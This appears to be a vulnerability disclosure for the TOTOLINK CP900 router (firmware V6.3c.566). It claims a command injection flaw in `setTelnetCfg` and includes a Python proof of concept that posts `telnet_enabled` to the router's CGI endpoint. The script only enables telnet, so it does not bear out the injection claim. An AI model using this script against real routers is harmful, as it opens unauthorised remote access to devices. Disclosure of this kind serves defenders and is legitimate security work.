## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address ：http://www.totolink.cn/data/upload/20210720/5bee10397c082b0419cbad3eb7d1bd97.zip

## Affected version

CP900 V6.3c.566

## Vulnerability details

In the CP900 V6.3c.566 firmware has a command injection vulnerability in the `setTelnetCfg` function. The `v5` variable receives the `telnet_enabled` parameter from a POST request. However, since the user can control the input of `telnet_enabled`, the telnet service can cause a command injection vulnerability.

![image-20240723210448686](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240723210448686.png)

## POC

```python
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
cookie = {"Cookie":"SESSION_ID=2:1721039211:2"}
data = {"telnet_enabled":"1", "topicurl":"setting/setTelnetCfg"}
response = requests.post(url, cookies=cookie, json=data)
print(response.text)
print(response)
```

![image-20240719233900221](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240719233900221.png)
